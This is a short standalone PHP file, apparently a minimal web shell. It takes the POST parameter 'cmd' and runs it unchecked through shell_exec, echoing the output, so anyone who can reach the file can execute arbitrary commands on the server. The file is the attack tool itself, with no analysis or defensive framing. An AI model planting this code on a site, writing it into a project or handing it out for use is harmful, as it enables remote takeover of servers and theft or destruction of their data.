<?php
function execute($com)
{
	if (!empty($com))
	{
		echo shell_exec($com);
	}
}

$cmd = $_POST['cmd'];
execute($cmd);
?>